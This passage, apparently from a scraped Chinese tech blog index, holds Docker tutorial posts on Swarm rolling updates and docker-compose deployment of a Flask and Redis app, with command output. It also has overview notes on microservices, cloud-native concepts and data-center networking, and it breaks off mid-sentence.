CURRENT STATE ERROR PORTS 3cxuushzkvo4 uber-svc.1 nigelpoulton/tu-demo:v1 lzl-c Running Running 6 minutes ago mc36cqxnh0gs uber-svc.2 nigelpoulton/tu-demo:v2 lzl-b Running Running 37 seconds ago xjv8k31yxhxt \\_ uber-svc.2 nigelpoulton/tu-demo:v1 lzl-b Shutdown Shutdown 39 seconds ago nok5eng7umqc uber-svc.3 nigelpoulton/tu-demo:v2 lzl-c Running Running 11 seconds ago xzxyzyk9kxy9 \\_ uber-svc.3 nigelpoulton/tu-demo:v1 lzl-c Shutdown Shutdown 13 seconds ago dkxz1gpg4f4f uber-svc.4 nigelpoulton/tu-demo:v2 lzl-d Running Running 37 seconds ago tg6zmzqwzab6 \\_ uber-svc.4 nigelpoulton/tu-demo:v1 lzl-d Shutdown Shutdown 39 seconds ago flgey27vyz35 uber-svc.5 nigelpoulton/tu-demo:v2 lzl Running Running 11 seconds ago y4jl7yg5jsc1 \\_ uber-svc.5 nigelpoulton/tu-demo:v1 lzl Shutdown Shutdown 13 seconds ago s8yvzixgbepo uber-svc.6 nigelpoulton/tu-demo:v1 lzl-d Running Running 6 minutes ago 69ghlllr9mi5 uber-svc.7 nigelpoulton/tu-demo:v1 lzl-b Running Running 6 minutes ago mtkg9y3j7dl3 uber-svc.8 nigelpoulton/tu-demo:v1 lzl Running Running 6 minutes ago 在滚动升级的过程中，同时存在新版本的服务和旧版本的服务。在这个时候去访问网站，可能会出现有的访问的是新的服务有的访问的是旧的服务。但升级期间我们的服务仍然是正常工作的，在滚动升级完成后，所以服务实例都被升级。\n故障排除 排障这部分主要是通过Swarm集群工作日志来实现的。\nlzl@lzl:~$ docker service logs uber-svc uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [1] [INFO] Starting gunicorn 20.1.0 uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [1] [INFO] Listening at: http://0.0.0.0:80 (1) uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [1] [INFO] Using worker: sync uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [6] [INFO] Booting worker with pid: 6 uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [7] [INFO] Booting worker with pid: 7 uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [8] [INFO] Booting worker with pid: 8 uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:03:19 +0000] [9] [INFO] Booting worker with pid: 9 uber-svc.8.mtkg9y3j7dl3@lzl | [2021-11-15 08:10:54 +0000] [1] [INFO] Handling signal: term ··· 退出Swarm模式 最后，我们down掉服务后，退出Swarm模式，将集群关闭。\n# 在工作节点上使用 lzl@lzl:~$ docker swarm leave Node left the swarm. # 在管理节点上使用 lzl@lzl:~$ docker swarm leave --force Node left the swarm. ","date":"2021-11-16T11:57:32+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8docker-swarm%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E9%9B%86%E7%BE%A4/","title":"使用Docker Swarm管理服务集群"},{"content":" Docker Compose可以在Docker节点上，以单引擎模式进行多容器应用的部署和管理。使用时，首先定义多容器的应用的YAML文件，然后就可以交给docker-compose进行部署。\n安装Docker Compose 直接访问Github的镜像源可能会超时，这样还有国内的镜像源可以使用，根据自己的需要修改版本号。\n# 可能会超时 $ sudo curl -L https://github.com/docker/compose/releases/download/2.1.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose # 使用国内镜像源 $ sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.28.5/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose # 增加权限 $ sudo chmod +x /usr/local/bin/docker-compose # 查看是否安装成功 $ docker-compose --version docker-compose version 1.28.5, build c4eb3a1f Compose文件 Docker Compose使用YAML文件定义多服务应用，YAML是JSON的子集，因此使用JSON也是可以的。文件的默认名是docker-compose.yml，也可使用-f参数指定具体的文件。\nversion: \u0026#34;3.5\u0026#34; services: web-fe: build: . command: python app.py ports: - target: 5000 published: 5000 networks: - counter-net volumes: - type: volume source: counter-vol target: /code redis: image: \u0026#34;redis:alpine\u0026#34; networks: counter-net: networks: counter-net: volumes: counter-vol: 这个文件包含4个一级key：version, services, networks, volumes。\nversion：是必须指定的，而且总是位于文件的第一行。它定义的是使用的Compose文件格式的版本。 services：用于定义不同的应用服务。就如上面的定义了两个服务，web-fe和redis。Docker Compose会将每个服务部署在各自的容器中。 networks：用于指定Docker创建新网络，默认情况下创建bridge形式的网络。这是单主机类型网络，只能实现同一主机上容器的连接。 volumes：指定创建新的卷。 根据networks和volumes会创建一个名为counter-net的网络和一个counter-vol的卷。services定义了两个二级key：web-fe和redis，因此会部署两个容器，这两个容器名字会使用这两个二级key。\n在web-fe服务中：\nbuild: .会基于当前目录，构建一个新的，用于启动容器的镜像，它会根据当前目录的Dockerfile构建镜像 command: python app.py指定该脚本为主程序 ports指定将容器内的- target的5000端口映射到主机published的5000端口上，也就是发送到主机5000端口的流量会被转发到Docker容器中的5000端口上 networks使Docker可以连接到指定网络，这个网络应该是已经存在的或者是一级key中定义的网络 volumes指定Docker将counter-vol卷(source:)挂载到容器内的/code(target:)，这个卷是应该已经存在或者在一级key中定义了的 使用Docker Compose部署应用 示例的文件在这里下载。目录结构如下：\n$ tree . ├── app.py\t# 应用程序代码 一个Flask应用 ├── docker-compose.yml\t# Compose文件，告诉Docker怎么部署应用 ├── Dockerfile\t# 定义如何构建web-fe镜像 ├── README.md\t└── requirements.txt\t# python 所需的依赖 下面在这个目录把应用启起来：\n这里需要注意的是，有些镜像源可能会拉去失败，我在更换了Docker的国内镜像源后就行了。\n$ docker-compose up \u0026amp; [1] 71363 $ Building web-fe Sending build context to Docker daemon 6.656kB Step 1/5 : FROM python:3.6-alpine 3.6-alpine: Pulling from library/python a0d0a0d46f8b: Already exists c11246b421be: Pulling fs layer ef6741e6e9c4: Pulling fs layer 9d6fa827d5ce: Pulling fs layer 01b777f5b036: Pulling fs layer 01b777f5b036: Waiting 9d6fa827d5ce: Verifying Checksum 9d6fa827d5ce: Download complete c11246b421be: Download complete c11246b421be: Pull complete 01b777f5b036: Verifying Checksum 01b777f5b036: Download complete ef6741e6e9c4: Verifying Checksum ef6741e6e9c4: Download complete ef6741e6e9c4: Pull complete 9d6fa827d5ce: Pull complete 01b777f5b036: Pull complete Digest: sha256:4d04019f2907a6463e07c385ad30d773b122e83a32112d6cfc15902a12179da2 Status: Downloaded newer image for python:3.6-alpine ---\u0026gt; c5aebf5e06c5 Step 2/5 : ADD . /code ---\u0026gt; fea08c327ce0 Step 3/5 : WORKDIR /code ---\u0026gt; Running in 0a3784bffe75 Removing intermediate container 0a3784bffe75 ---\u0026gt; 8ea8abf1588d Step 4/5 : RUN pip install -r requirements.txt ---\u0026gt; Running in 1734648fa3fc Collecting flask Downloading Flask-2.0.2-py3-none-any.whl (95 kB) Collecting redis Downloading redis-3.5.3-py2.py3-none-any.whl (72 kB) Collecting click\u0026gt;=7.1.2 Downloading click-8.0.3-py3-none-any.whl (97 kB) Collecting Werkzeug\u0026gt;=2.0 Downloading Werkzeug-2.0.2-py3-none-any.whl (288 kB) Collecting itsdangerous\u0026gt;=2.0 Downloading itsdangerous-2.0.1-py3-none-any.whl (18 kB) Collecting Jinja2\u0026gt;=3.0 Downloading Jinja2-3.0.3-py3-none-any.whl (133 kB) Collecting importlib-metadata Downloading importlib_metadata-4.8.2-py3-none-any.whl (17 kB) Collecting MarkupSafe\u0026gt;=2.0 Downloading MarkupSafe-2.0.1-cp36-cp36m-musllinux_1_1_x86_64.whl (29 kB) Collecting dataclasses Downloading dataclasses-0.8-py3-none-any.whl (19 kB) Collecting zipp\u0026gt;=0.5 Downloading zipp-3.6.0-py3-none-any.whl (5.3 kB) Collecting typing-extensions\u0026gt;=3.6.4 Downloading typing_extensions-3.10.0.2-py3-none-any.whl (26 kB) Installing collected packages: zipp, typing-extensions, MarkupSafe, importlib-metadata, dataclasses, Werkzeug, Jinja2, itsdangerous, click, redis, flask WARNING: Running pip as the \u0026#39;root\u0026#39; user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv Successfully installed Jinja2-3.0.3 MarkupSafe-2.0.1 Werkzeug-2.0.2 click-8.0.3 dataclasses-0.8 flask-2.0.2 importlib-metadata-4.8.2 itsdangerous-2.0.1 redis-3.5.3 typing-extensions-3.10.0.2 zipp-3.6.0 WARNING: You are using pip version 21.2.4; however, version 21.3.1 is available. You should consider upgrading via the \u0026#39;/usr/local/bin/python -m pip install --upgrade pip\u0026#39; command. Removing intermediate container 1734648fa3fc ---\u0026gt; f6d6d22ade59 Step 5/5 : CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] ---\u0026gt; Running in c11adb1eb784 Removing intermediate container c11adb1eb784 ---\u0026gt; 1e3f0e452820 Successfully built 1e3f0e452820 Successfully tagged counter-app-master_web-fe:latest WARNING: Image for service web-fe was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`. Pulling redis (redis:alpine)... alpine: Pulling from library/redis a0d0a0d46f8b: Already exists a04b0375051e: Pull complete cdc2bb0f9590: Pull complete 0aa2a8e7bd65: Pull complete f64034a16b58: Pull complete 7b9178a22893: Pull complete Digest: sha256:58132ff3162cf9ecc8e2042c77b2ec46f6024c35e83bda3cabde76437406f8ac Status: Downloaded newer image for redis:alpine Creating counter-app-master_web-fe_1 ... done Creating counter-app-master_redis_1 ... done Attaching to counter-app-master_redis_1, counter-app-master_web-fe_1 redis_1 | 1:C 11 Nov 2021 08:10:29.159 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo redis_1 | 1:C 11 Nov 2021 08:10:29.159 # Redis version=6.2.6, bits=64, commit=00000000, modified=0, pid=1, just started redis_1 | 1:C 11 Nov 2021 08:10:29.159 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf redis_1 | 1:M 11 Nov 2021 08:10:29.160 * monotonic clock: POSIX clock_gettime redis_1 | 1:M 11 Nov 2021 08:10:29.161 * Running mode=standalone, port=6379. redis_1 | 1:M 11 Nov 2021 08:10:29.161 # Server initialized redis_1 | 1:M 11 Nov 2021 08:10:29.161 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add \u0026#39;vm.overcommit_memory = 1\u0026#39; to /etc/sysctl.conf and then reboot or run the command \u0026#39;sysctl vm.overcommit_memory=1\u0026#39; for this to take effect. redis_1 | 1:M 11 Nov 2021 08:10:29.162 * Ready to accept connections web-fe_1 | * Serving Flask app \u0026#39;app\u0026#39; (lazy loading) web-fe_1 | * Environment: production web-fe_1 | WARNING: This is a development server. Do not use it in a production deployment. web-fe_1 | Use a production WSGI server instead. web-fe_1 | * Debug mode: on web-fe_1 | * Running on all addresses. web-fe_1 | WARNING: This is a development server. Do not use it in a production deployment. web-fe_1 | * Running on http://172.18.0.2:5000/ (Press CTRL+C to quit) web-fe_1 | * Restarting with stat lzl@lzl:~/WorkSpace/docker/counter-app-master$ web-fe_1 | * Debugger is active! web-fe_1 | * Debugger PIN: 126-336-179 lzl@lzl:~/WorkSpace/docker/counter-app-master$ 其启动流程如下：\n首先会找到Dockerfile，按照内容进行镜像构建。 FROM python:3.6-alpine ADD . /code WORKDIR /code RUN pip install -r requirements.txt CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] docker-compose up会查找名为docker-compose.yml或docker-compose.yaml的文件，按照文件学的进行多服务引用的构建。如果是其他的就需要用docker-compose -f xxx.yml up参数来启动。如果是docker-compose -f xxx.yml up -d这个-d命令使其在后台启动。\n这样应用就构建并启动起来了。\n$ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE counter-app-master_web-fe latest 1e3f0e452820 5 minutes ago 52.5MB python 3.6-alpine c5aebf5e06c5 2 weeks ago 40.8MB redis alpine e24d2b9deaec 5 weeks ago 32.3MB $ docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 93b990e9d382 counter-app-master_web-fe \u0026#34;python app.py\u0026#34; 7 minutes ago Up 7 minutes 0.0.0.0:5000-\u0026gt;5000/tcp, :::5000-\u0026gt;5000/tcp counter-app-master_web-fe_1 024d6af94218 redis:alpine \u0026#34;docker-entrypoint.s…\u0026#34; 7 minutes ago Up 7 minutes 6379/tcp counter-app-master_redis_1 $ docker network ls NETWORK ID NAME DRIVER SCOPE 923f7682872b bridge bridge local 66054169df04 counter-app-master_counter-net bridge local 7a84b4fa35eb host host local 66b37b687b76 none null local $ docker volume ls DRIVER VOLUME NAME local 4569b40ca4ad82b1c32612c1859721b8f3bafafa90455000520d7cb0c8764373 local counter-app-master_counter-vol 我们可以从中看到，新拉取的镜像，创建的容器以及网络和卷。然后打开我们的浏览器，访问5000端口。\n此外，因为我们在启动时使用了\u0026amp;，这会将所有日志输出到终端。 web-fe_1 | 172.18.0.1 - - [11/Nov/2021 08:22:42] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - web-fe_1 | 172.18.0.1 - - [11/Nov/2021 08:22:42] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 - web-fe_1 | 172.18.0.1 - - [11/Nov/2021 08:22:48] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 这样，我们就通过docker compose文件成功部署了两个服务（容器）的应用。 使用Docker Compose管理应用 关闭服务的命令很简单，但实际上down使用了两个命令，分别是stop和rm：\n$ docker-compose down Stopping counter-app-master_redis_1 ... Stopping counter-app-master_web-fe_1 ... redis_1 | 1:signal-handler (1636619854) Received SIGTERM scheduling shutdown... redis_1 | 1:M 11 Nov 2021 08:37:34.813 # User requested shutdown... redis_1 | 1:M 11 Nov 2021 08:37:34.813 * Saving the final RDB snapshot before exiting. Stopping counter-app-master_redis_1 ... done redis_1 | 1:M 11 Nov 2021 08:37:34.815 # Redis is now ready to exit, bye bye... Stopping counter-app-master_web-fe_1 ... done counter-app-master_web-fe_1 exited with code 0 Removing counter-app-master_redis_1 ... done Removing counter-app-master_web-fe_1 ... done Removing network counter-app-master_counter-net [1]+ Done docker-compose up 首先，尝试停止两个服务。 向服务发送SIGTERM优雅关闭服务。 我们发现在退出之前会保存卷数据，这个卷保证数据持久化存储，卷的生命周期和容器的是解耦的。 在后台启动：\n$ docker-compose up -d Creating network \u0026#34;counter-app-master_counter-net\u0026#34; with the default driver Creating counter-app-master_web-fe_1 ... done Creating counter-app-master_redis_1 ... done 查看已经启动的服务：\n$ docker-compose ps Name Command State Ports --------------------------------------------------------------------------------------------------------------- counter-app-master_redis_1 docker-entrypoint.sh redis ... Up 6379/tcp counter-app-master_web-fe_1 python app.py Up 0.0.0.0:5000-\u0026gt;5000/tcp,:::5000-\u0026gt;5000/tcp 查看每个服务中的进程：\n$ docker-compose top counter-app-master_redis_1 UID PID PPID C STIME TTY TIME CMD ---------------------------------------------------------------------- 999 73540 73474 0 16:42 ? 00:00:00 redis-server *:6379 counter-app-master_web-fe_1 UID PID PPID C STIME TTY TIME CMD -------------------------------------------------------------------------------------- root 73576 73519 2 16:42 ? 00:00:00 python app.py root 73706 73576 2 16:42 ? 00:00:00 /usr/local/bin/python /code/app.py 与关闭服务的down不同，stop是暂停服务，在列表中仍然可以看到：\n$ docker-compose stop Stopping counter-app-master_web-fe_1 ... done Stopping counter-app-master_redis_1 ... done $ docker-compose ps Name Command State Ports ----------------------------------------------------------------------------- counter-app-master_redis_1 docker-entrypoint.sh redis ... Exit 0 counter-app-master_web-fe_1 python app.py Exit 0 进一步，使用rm会删除Compose应用，但是不会删除镜像和卷：\n$ docker-compose rm Going to remove counter-app-master_web-fe_1, counter-app-master_redis_1 Are you sure? [yN] y Removing counter-app-master_web-fe_1 ... done Removing counter-app-master_redis_1 ... done $ docker-compose ps Name Command State Ports 已经rm的应用是不能通过restart命令重启的，而stop的可以通过restart重启\n$ docker-compose rm Going to remove counter-app-master_web-fe_1, counter-app-master_redis_1 Are you sure? [yN] y Removing counter-app-master_web-fe_1 ... done Removing counter-app-master_redis_1 ... done $ docker-compose restart ERROR: No containers to restart ERROR: 1 $ docker-compose stop Stopping counter-app-master_redis_1 ... done Stopping counter-app-master_web-fe_1 ... done $ docker-compose restart Restarting counter-app-master_redis_1 ... done Restarting counter-app-master_web-fe_1 ... done 应用使用卷volume进行持久化存储 在上面的实例中，我们先看Dockerfile文件：\nFROM python:3.6-alpine ADD . /code WORKDIR /code RUN pip install -r requirements.txt CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 我们将主机上的项目根目录中的文件拷贝到容器中的/code目录下，并设为工作目录。\n然后在docker-compose.yml文件中：\nversion: \u0026#34;3.5\u0026#34; services: web-fe: build: . command: python app.py ports: - target: 5000 published: 5000 networks: - counter-net volumes: - type: volume source: counter-vol target: /code redis: image: \u0026#34;redis:alpine\u0026#34; networks: counter-net: networks: counter-net: volumes: counter-vol: 我们把用于数据存储的卷counter-vol挂载到/code目录下，也就是target: /code。在使用docker-compose up第一次启动应用时，会查找是否指定的卷已经存在，如果没有就按照一级key指定的创建，并进行挂载。\n使用down是不会删除卷的，所以在第二次启动时，速度会快很多，因为指定的卷已经存在了。\n这同样说明，在Docker主机中对卷中的数据进行修改，会反映到容器中，我们来验证下。（此时应用是运行中的）\n编辑app.py文件，显示不同的内容。我们加一个\u0026quot;A New Change!\u0026quot;。\n然后将更新的文件复制到Docker主机相应的卷中，也就是复制到一个或者多个容器的挂载点上。使用如下命令查看容器在主机的挂载点：\n$ docker volume inspect counter-app-master_counter-vol [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-11-11T16:10:28+08:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: { \u0026#34;com.docker.compose.project\u0026#34;: \u0026#34;counter-app-master\u0026#34;, \u0026#34;com.docker.compose.version\u0026#34;: \u0026#34;1.28.5\u0026#34;, \u0026#34;com.docker.compose.volume\u0026#34;: \u0026#34;counter-vol\u0026#34; }, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/counter-app-master_counter-vol/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;counter-app-master_counter-vol\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] \u0026quot;Mountpoint\u0026quot;: \u0026quot;/var/lib/docker/volumes/counter-app-master_counter-vol/_data\u0026quot;就是。然后进行复制。\n$ sudo cp app.py /var/lib/docker/volumes/counter-app-master_counter-vol/_data/app.py 我们刷新下页面：\n已经变了，说明是起作用的。\n","date":"2021-11-11T14:47:36+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8docker-compose%E9%83%A8%E7%BD%B2%E5%BA%94%E7%94%A8/","title":"使用docker-compose部署应用"},{"content":"1. 微服务 微服务的引入解决了单体服务的复杂性，将明确定义的功能分成粒度更小的服务，是每个微服务独立迭代、独立部署，独立拓展、独立重启。达到服务之间的松耦合，进而使得业务的频繁变更在用户看来低感知。\n相比传统单体架构，微服务的优点如下：\n单个微服务复杂度降低 独立迭代、独立部署，独立拓展 跨语言 开发敏捷 同时，将单体服务拆分成微服务，也引入一些问题：\n运维复杂 分布式系统复杂 进一步引出需要解决的网络延迟、容错性、消息序列化、网络稳定性、异步机制、版本差异、调用链过长等问题。\n你可能会问了，既然微服务会引入这么多问题，那为什么还要用微服务呢？\n答案就是：在真正需要使用微服务架构的地方使用微服务，会大大提高生产力。（所以一些单体架构就能满足的简单业务就没有必要使用微服务了）\n2. 容器 容器的出现是以虚拟化技术为依托，容器在低级虚拟化的基础上，实现了OS层面之上的虚拟化，或者说进程级别的虚拟化。每个容器有自己的文件空间、网络、计算等资源，虽然它们共享主机的资源，但是这些资源是隔离的。\n容器技术分为运行时和编排两个层次。\n运行时：与容器的计算、存储、网络等实际的计算任务有关 编排：对容器集群的调度、服务发现和资源管理等 Docker和Kubernetes的组合实现了从服务打包成镜像、移植、编排、部署、扩缩容、维护等一系列工作。\n3. 服务网格 在微服务中可分为两种架构，入侵式架构和非入侵式架构。\n入侵式架构：服务框架嵌入程序代码，开发者在开发时需要组合各种插件实现业务之外的架构问题；如：RCP、负载均衡、熔断等。 非入侵式架构：业务之外的组件以代理的形式与应用程序部署在一起，结果应用程序的网络且对其透明，开发者只需注重业务本身，其中代表的技术就是服务网格。 Service Mesh使系统技术栈下移，可以说作为微服务的基础设施。用于处理服务间的请求响应的可靠传递、服务治理，解耦服务监控、链路追踪、熔断、服务发现等问题。\n4. DevOps 关于DevOps，可能给不出一个具体的定义，但是这代表一种思想，一种开发、运维的模式，其主要目的在于将开发和运维之间的关系拉近，它永远是面向业务的。这种实践包括持续集成、持续测试、持续交付、持续部署，使得业务可以滚动式的升级。打通团队从研发、测试、运维甚至产品、客户反馈的业务链条。来适应快速变化的市场和稍纵即逝的风口。\n","date":"2021-11-08T23:41:03+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%A8%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF%E7%BB%84%E6%88%90/","title":"云原生在实践中的技术组成"},{"content":" 今天在图书馆借了两本云计算安全方面的教材类书籍，系统的了解一下云计算安全技术涉及到的相关内容和一些基本概念。通过本文，你可以了解云计算网络安全涉及的基本知识面。\n1. 云计算网络概述 1.1 基本概念 云计算是一种提供对共享的、可配置的计算资源池（如网络、服务器、存储、应用及服务等）进行泛在的、便捷的和按需的网络接入访问的模型。在这种模型下，计算资源能够被快速地分配和释放，同时最小化管理工作的投入和服务提供商的参与。\n目的 提供弹性、透明的资源服务 提高资源利用率，降低成本 网络是云计算的基础。通过网络实现资源虚拟化、池化以及对资源的有效管理。\n云计算基本特征\n按需自助服务 广泛的网络接入 资源池化 快速弹性 可测量的服务 云计算服务模型\nIaaS：硬件资源层面上的抽象，如虚拟机、Amazon EC2、Microsoft Azure、Google Compute Engine PaaS：提供常用软件构建环境、工具、部署等服务，用户不能自己管理网络、存储等底层云的内容，只能控制自己所部署的应用程序等；关键技术在并称编程模型、资源监控调度、海量数据库、分布式文件、存储系统等 SaaS：可以理解成现在用的一些服务商提供的软件，如Google Gmail等 云计算部署模型（根据云平台的所有权和管理权划分）\n公有云：成本低，拓展性好；需要实现对多租户性能、资源和数据等方面的安全隔离；如阿里云、Google Cloud等 私有云：一般是部署在企业组织内部的，由单一组织专用；一般是通过内网、VPN为员工提供IaaS或者SaaS服务；安全性较高 社区云：可以理解成区块链中联盟链的模式 混合云：实现不同模式的数据和应用的可移植性，例如将敏感数据部署到私有云，安全性要求较低的数据部署到公有云 1.2 云计算网络安全技术 云计算数据中心（用于托管软硬件资源）网络通过大量二、三层交换机和路由器将服务存储有效的连接起来，通过进一步的虚拟化技术提供了云计算服务。\n云计算网络存在的安全挑战 网络规模庞大 流量模式不同（可以重点关注）：服务器到用户的南北向流量、服务器之间的东西向流量、Mice Flow数量众多对延迟敏感、Elephant Flow传输时间长且需要高带宽，更容易导致拥塞 高带宽低延迟的需求 拓扑结构复杂 资源虚拟化 2. 数据中心网络技术 数据中心是云计算等应用的重要基础设施，一般包括大量的服务器、存储和网络等硬件设备，以及运行在这些设备上的操作系统和管理软件，此外还有各种安全设备。数据中心网络则要提供高带宽、低延时和零丢包的网络通信环境。\n2.1 数据中心网络流量 根据通信双方实体类型分 服务器与客户端之间的流量：南北向流量，主要采用基于IP的三层路由转发 服务器与服务器之间的流量：东西向流量，对云计算应用的性能至关重要，一般是基于IP的三层转发和基于MAC的二层转发两种形式；三层流量主要是数据中心不同服务之间调用所使用（如Web服务调用数据库服务），二层主要是同一类服务器之间的数据同步计算（如Web集群负载均衡） 根据流量大小分 大数据流：数量众多且对延迟敏感 小数据流：容易对网络负载均衡给出挑战 由于虚拟化技术使得通信的实体逐渐转向运行在物理机上的虚拟机和容器，它们弹性、动态地部署都对网络中数据流量的调度提出新的挑战。\n由于以太网的高性价比和数据传输率，使其成为数据中心使用的最广泛的数据传输技术。此外，数据中心网络也开始使用iSCSI和FCoE等技术实现网络融合。\n2.2 数据中心网络拓扑 以交换机为核心的网络架构 传统三层网络拓扑架构 Clos网络架构 Spine-Leaf网络架构 Fat-Tree网络架构 以服务器为核心的网络结构 DCell FiConn BCube 2.3 数据中心的大二层网络 为使资源可以弹性分配和日益增长的东西向流量需求，有了“大二层”的网络环境的需求，也就是整个数据中心网络属于一个二层广播域。包含物理网络规模和业务支撑两方面的要求。在大二层中虚拟机的创建和迁移不需要对IP或者默认网关的修改，一般将L2、L3的网络边界放在核心交换机。\n大二层网络面临的问题\nMAC地址学习问题：大二层网络规模庞大，在具有大量节点的网络中泛洪，影响网络性能 生成树协议的问题：冗余网络带来环路问题，以太网使用的生成树协议会阻断冗余链路，造成链路资源浪费，降低网络性能、增大交换机负载 VLAN技术的局限：租户数量超出VLAN的最大支持数量 网络安全问题 为解决上述问题，最直接的方法是摆脱STP协议\n方案一：采用网络虚拟化技术 方案二：实现二层多路径传输技术L2 Fabric，代表方案有TRILL、VXLAN等 2.4 数据中心桥接 以太网是不可靠的，数据网络和存储网络很可能使用不同的协议，因此需要一个承载协议能够适应不同的应用服务的需求，基于以太网的数据桥接技术成为最佳选择。\n数据中心桥接（Data Center Bridging）对以太网特性进行扩充优化，避免链路中的丢包，保证数据传输质量： 基于优先级的流量控制PFC 多级调度的增强传输选择ETS 给予反馈的量化拥塞通知QCN 提供了DCB自动化配置 保持兼容性 相应的DCB的主要机制： 基于优先级的流量控制PFC：提供了不丢包的流量控制，保证关键业务流量和非关键业务流量的隔离，是DCB的基础 增强传输选择ETS：实现链路带宽的分配问题 量化拥塞通知QCN：一种可以直接溯源、可量化调整的拥塞控制机制 数据中心桥接交换DCBX：是完成这些工作的一个自动协商协议，允许链路两端的设备自动确认对端是否支持PFC和ETS，并且能够协商PFC和ETS的参数。 3. 服务器虚拟化与网络技术 服务器虚拟化对扩展数据中心用户承载能力和提高硬件资源利用率有着十分重要的作用。通过虚拟化技术降低实际使用的物理机的数量并提高利用率，同时减轻管理成本。\n3.1 虚拟化基本概念 虚拟化是一种将物理资源（计算、网络、存储等）进行抽象、转换和隔离，并最终向用户呈现一个可动态配置的虚拟运行环境，使得用户使用资源时不再受资源的物理配置与地理位置的限制。\n虚拟化中，宿主机通常就是物理服务器，运行着宿主操作系统。Hypervisor是虚拟机监视器VMM用来创建与运行虚拟机的软件、固件或者硬件。Hypervisor上面运行的虚拟机叫客户机Guest Machine。\n虚拟化分类 全虚拟化 半虚拟化 硬件辅助虚拟化：CPU针对性的从指令层面简化虚拟化技术 操作系统层面的虚拟化：namespace、cgroups、chroot，也称容器技术如Docker 容器技术基于操作系统的资源隔离技术，为应用程序构建出一个轻量级、标准化，并与其他应用程序互相隔离的运行环境。容器中包含应用程序本身以及必需的运行环境（一般叫做镜像），使得该容器能够在任何具有容器引擎（如Docker Engine）中运行。\n在硬件资源的利用率上容器技术强于虚拟机。节省开发、测试和部署的时间。\n项目 容器 虚拟机 启动时间 秒级 分钟级 存储占用 MB级 GB级 性能 接近裸机 明显的性能损失 单机部署数量 最多上千个 最多几十台 Docker技术基于Linux的资源隔离技术（namespace、cgroups和chroot），目前比较主流。而容器也作为下一代虚拟化技术。\n常见的Hypervisor有：VMWare vSphere、 Microsoft Hyper-V和Open Stack，其中Open Stack是开源的。\n3.2 硬件辅助虚拟化 Guest OS自认为处于内核态，如果Host OS处理其发出的一些特权指令会带来很大的性能开销。所以会有硬件辅助提高虚拟化体验的需要。\n3.3 虚拟网络接入 虚拟交换机 由于一个物理机上可能有成百上千个虚拟机和容器，显然1：1的配置物理网卡等网络设备是不现实的，因此使用虚拟网络来对真实网络进行模拟。使用软件的形式模拟一台交换机，方便的按需部署。\n边界虚拟网桥技术 目的是让虚拟机以适当的方式共享宿主机上的物理网卡，尽量达到与虚拟机独占物理机网卡接近的性能。\n3.4 容器网络技术 接入方式 Bridge：利用Linux Bridge等虚拟网桥连接到物理网卡。Docker会默认使用这种方法，进程启动时，会在主机上创建虚拟网桥，其他容器会连到虚拟网桥上。此外，Docker还支持OVS(Open vSwitch)，有更强大的功能，在生产环境中多用。 Host：容器直接使用宿主机的网络协议栈，共享主机IP。容器有独立的进程和文件空间但没有独立的Network Namespace。 Container：可以与其他容器共享网络协议栈。 macvlan：把Docker宿主机上的物理网卡在逻辑上虚拟出多个虚拟网卡，并给每一个子接口分配虚拟的MAC地址。如果容器发送数据目的地址在本机，则直接转发到相应的容器中，否则交给物理网卡处理。 User-defined：支持用户高级自定义。 None：容器拥有自己的Network Namespace但是不提供任何网络配置，需要用户为容器添加网卡、配置IP等。 跨主机网络通信 多主机的Docker集群上，有了对Docker跨主机通信技术的需求。\nFlat：要求所有容器在同一个可路由的网络环境中 Hierarchy：要求容器必须L3可路由，并且具有相同的IP层次。 Overlay：为不同主机上的Docker容器创建分布式网络，使得不同主机的容器可以相互通信。这种方式需要实现Linux Network Namespace来隔离不同容器间的网络资源、VXLAN把二层数据包封装到UDP数据包后运输来实现大二层网络、以及一个分布式的k-v数据库来运行发现协议和保存docker集群中的个主机信息。同时也需要分布式的虚拟交换机来转发不同主机之间的数据流。 通用数据模型 CNM：Docker的容器网络模型，为IP地址管理插件（负责地址池的创建、删除以及地址分配）和网络插件（负责创建和删除容器虚拟网络，以及分配和回收IP地址）提供接口。基本概念包括：\nSandbox：利用Linux Network 